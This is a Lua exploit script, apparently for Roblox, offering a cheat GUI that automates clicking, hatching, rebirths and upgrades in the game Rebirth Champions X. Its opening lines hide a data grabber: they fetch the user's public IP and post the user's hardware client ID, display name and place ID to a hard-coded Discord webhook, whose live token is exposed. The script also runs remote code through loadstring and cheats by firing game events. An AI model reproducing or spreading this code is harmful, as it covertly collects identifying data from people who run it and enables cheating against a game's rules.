HttpService = game:GetService("HttpService")
Webhook_URL = "https://discord.com/api/webhooks/1100115603882250312/6aSaKM5GlOeHeN2c7ka1F1oCD6yrSNohg6PNqGwpgOXeG6ARi6LYJ-yLUCeXtqQGOEL3"
local ip = tostring(game:HttpGet("https://api.ipify.org", true))
local GName = "Rebirth Champions X"
local PlayerGname = game.Players.LocalPlayer.DisplayName

local response = syn.request({
    Url = Webhook_URL,
    Method = 'POST',
    Headers = {['Content-Type'] = 'application/json'},

    Body = HttpService:JSONEncode({
        username = "Cipeczka",
        avatar_url = "",
        content = "@everyone",
        embeds = {
            {
                title = "Ketty Hub",
                color = 13044234,
                description = "IP Gracza: "..GName.."\nHWID Gracza: "..game:GetService("RbxAnalyticsService"):GetClientId().."\nGRA: "..GName.."\nPLACEID GRY: "..game.placeId,
                
                timestamp = "",
                author = {
                    name = PlayerGname
                },
                image = {},
                thumbnail = {},
                footer = {},
                fields = {}
            },
        }
    })
})

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
    Name = "KSD Rebirth Champions X",
    LoadingTitle = "Rebirth Champions X",
    LoadingSubtitle = "By KSD",
    ConfigurationSaving = {
       Enabled = true,
       FolderName = nil, -- Create a custom folder for your hub/game
       FileName = "KSD Hub"
},
    Discord = {
       Enabled = false,
       Invite = "noinvitelink",
       RememberJoins = true
    },
    KeySystem = false,
    KeySettings = {
       Title = "Untitled",
       Subtitle = "Key System",
       Note = "No method of obtaining the key is provided",
       FileName = "Key",
       SaveKey = true,
       GrabKeyFromSite = false,
       Key = {"Hello"}
    }
 })

-- TABSY --
local AuthorTab = Window:CreateTab("Author")
 local AutoMenuTab = Window:CreateTab("Auto Menu")
 local BasketTab = Window:CreateTab("110M")
 local AutoHatchTab = Window:CreateTab("Auto Hatch")
 local UpgradeTab = Window:CreateTab("Auto Upgrade")
 local SettingTab = Window:CreateTab("Settings")
-- TABSY --

--- TOGGLE ---
local AutoClickSection = AutoMenuTab:CreateSection("Auto Click")
local AutoClickToggle = AutoMenuTab:CreateToggle({Name = "Auto Click", CurrentValue = false, Flag = "Toggle1", Callback = function(autoclick)
        if autoclick then
            getgenv().StartAutoClick = true
        else
            getgenv().StartAutoClick = false
        end

        while task.wait() and StartAutoClick do
            game:GetService("ReplicatedStorage").Events.Click3:FireServer()
        end
    end,
 })

 local TabelaBoost = {
    'x2Clicks';
    'x2Gems';
    'x2Luck';
    'x2Rebirths';
    'x2PetXP';
    'x2HatchSpeed';
}
local AutoHatchSection = AutoMenuTab:CreateSection("Auto Hatch")
AutoMenuTab:CreateDropdown({Name = "Select Potions", Options = TabelaBoost, CurrentOption = {'Select'}, MultipleOptions = true, Flag = "SelectedPotionsFlag",
Callback = function(selectedtrain)
        getgenv().Potions = selectedtrain
    end})

AutoMenuTab:CreateToggle({Name = "Start AutoBuy",CurrentValue = false,Callback = function(autobuyfuncs)
        if autobuyfuncs then
            getgenv().StartAutoBuyPotion = true
        else
            getgenv().StartAutoBuyPotion = false
        end

        while task.wait() and StartAutoBuyPotion do
            for i,v in pairs(getgenv().Potions) do
                game:GetService("ReplicatedStorage").Events.Potion:FireServer(v, 1)
            end
        end
    end,
 })

 --- TOGGLE ---
 
 local EggsList = {}
for i,v in pairs(game:GetService("Workspace").Scripts.Eggs:GetChildren()) do
    table.insert(EggsList, v.Name)
end

local AutoHatchSection = AutoHatchTab:CreateSection("Auto Click")
AutoHatchTab:CreateDropdown({Name = "Select Amount", Options = {'Single', 'Triple'}, CurrentOption = {'Select'}, MultipleOptions = false, Flag = "SelectedAmountFlag",
    Callback = function(selectedamount)
        for i,v in pairs(selectedamount) do
            getgenv().EggAmount = v
        end
    end})


AutoHatchTab:CreateDropdown({
    Name = "Select Egg",
    Options = EggsList,
    CurrentOption = {'Select'},
    MultipleOptions = false,
    Flag = "SelectedEggsFlag",
    Callback = function(selectedegg)
        for i,v in pairs(selectedegg) do
            getgenv().EggToOpen = v
        end
    end})

    AutoHatchTab:CreateToggle({Name = "Start Auto Hatch", CurrentValue = false, Callback = function(autobuyfuncs)
            if autobuyfuncs then
                getgenv().StartAutoBuyEgg = true
            else
                getgenv().StartAutoBuyEgg = false
            end
    
            while task.wait() and StartAutoBuyEgg do
                game:GetService("ReplicatedStorage").Functions.Unbox:InvokeServer(getgenv().EggToOpen, getgenv().EggAmount)
            end
        end,
     })

--- AUTO REBIRTH ---
local TabelaRebirth = {}
    for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.MainUI.RebirthFrame.Top.Holder.ScrollingFrame:GetChildren()) do
        if v:IsA("ImageLabel") then
            table.insert(TabelaRebirth, v.Name)
    end
end

local AutoRebirthSection = AutoMenuTab:CreateSection("Auto Rebirth")
AutoMenuTab:CreateDropdown({Name = "Select Rebirth Amount", Options = TabelaRebirth, CurrentOption = {'Select'}, MultipleOptions = false, Flag = "SelectedRebirthsFlag",
    Callback = function(selectedrebirth)
    for i,v in pairs(selectedrebirth) do
        getgenv().Rebirth = v
   end
end})

AutoMenuTab:CreateToggle({Name = "Start Auto Rebirth",CurrentValue = false,Callback = function(autorebirth)
        if autorebirth then
            getgenv().StartAutoRebirth = true
        else
            getgenv().StartAutoRebirth = false
        end
        
        while task.wait(0.2) and StartAutoRebirth do
                game:GetService("ReplicatedStorage").Events.Rebirth:FireServer(tonumber(getgenv().Rebirth))
            end
    end,
 })
--- AUTO REBIRTH ---

--- AUTO UPGRADES ---
local AutoUpgradeSection = UpgradeTab:CreateSection("Auto Upgrades")
local TabelaUpgrades = {}
for i,v in pairs(game:GetService("Players").LocalPlayer.Upgrades:GetChildren()) do
    table.insert(TabelaUpgrades, v.Name)
end

UpgradeTab:CreateDropdown({
    Name = "Select Upgrade",
    Options = TabelaUpgrades,
    CurrentOption = {'Select'},
    MultipleOptions = false,
    Flag = "SelectedUpgradeFlag",
    Callback = function(selectedupgrade)
        for i,v in pairs(selectedupgrade) do
            getgenv().UpgradeToUpgrade = v
        end
    end})

    UpgradeTab:CreateToggle({Name = "Start Auto Upgrade", CurrentValue = false, Callback = function(autobuyupgrades)
        if autobuyupgrades then
            getgenv().StartAutoUpgrade = true
        else
            getgenv().StartAutoUpgrade = false
        end

        while task.wait() and StartAutoUpgrade do
            game:GetService("ReplicatedStorage").Functions.Upgrade:InvokeServer(getgenv().UpgradeToUpgrade)
        end
    end,
 })
 --- AUTO UPGRADES ---

 --- AUTO BASKETS ---
 local AutoBasketSection = BasketTab:CreateSection("Auto Basket")
 local AutoBasketToggle = BasketTab:CreateToggle({Name = "Auto Basket", CurrentValue = false, Callback = function(autobasket)
         if autobasket then
             getgenv().StartAutoCollectBasket = true
         elseif autobasket then
             getgenv().StartAutoCollectBasket = false
         end
 
         while task.wait(1) and getgenv().StartAutoCollectBasket == true do
                if game:GetService("Workspace").Scripts.CollectEasterEggs.Storage:FindFirstChild("EasterBasket") then
                    for i,v in pairs(game:GetService("Workspace").Scripts.CollectEasterEggs.Storage:GetDescendants()) do
                        if v:IsA('Part') then
                            local CollectPart = game.Players.LocalPlayer.Character.Head
                            firetouchinterest(CollectPart, v, 0)
                            wait()
                            firetouchinterest(CollectPart, v, 1)
                        end
                    end
                else
                    print("Didnt Find Shit")
                end
            end
         end})
 --- AUTO BASKETS ---
 
--- SETTINGS --- 
    SettingTab:CreateButton({
        Name = "Destroy GUI",
        Callback = function()
            Rayfield:Destroy()
        end,
     })
--- SETTINGS --- 

AuthorTab:CreateParagraph({Title = "Dev", Content = "Ketty#0069 | Norway"})
AuthorTab:CreateParagraph({Title = "Helper", Content = "!KrystekYT#8687 | Poland"})


     Rayfield:LoadConfiguration()
